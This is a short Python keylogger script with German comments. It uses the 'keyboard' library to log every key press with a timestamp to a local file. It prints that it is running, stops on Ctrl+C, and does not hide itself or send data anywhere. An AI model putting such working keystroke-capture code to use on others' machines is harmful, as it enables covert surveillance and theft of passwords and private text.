import keyboard
from datetime import datetime
import uuid
import sys

# Log-Datei für den Keylogger erstellen
log_file = open(f"keylog_{uuid.uuid4()}.txt", "a")

# Funktion, die aufgerufen wird, wenn eine Taste gedrückt wird
def on_key(event):
    try:
        # Protokolliere die gedrückte Taste
        key = event.name
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_file.write(f"{timestamp}: {key}\n")
        log_file.flush()
    except Exception as e:
        print(f"Fehler beim Loggen der Taste: {e}")

# Funktion zum Beenden des Programms
def exit_program():
    print("\nKeylogger wird gestoppt. Beende das Programm...")
    try:
        log_file.close()
    except Exception as e:
        print(f"Fehler beim Schließen der Log-Datei: {e}")
    sys.exit(0)

# Registriere die Tasteneingaben
try:
    keyboard.on_press(on_key)
except Exception as e:
    print(f"Fehler beim Registrieren der Tasteneingaben: {e}")
    sys.exit(1)

# Status anzeigen
def show_status():
    print("\nKeylogger läuft. Drücke Strg + C, um den Keylogger zu stoppen.")
    print("Alle gedrückten Tasten werden in einer Log-Datei gespeichert.\n")

# Registriere Strg + C zum Beenden des Programms
keyboard.add_hotkey('ctrl+c', exit_program)

# Anzeige, dass der Keylogger aktiv ist
show_status()

# Warte auf Tastatureingaben
keyboard.wait()
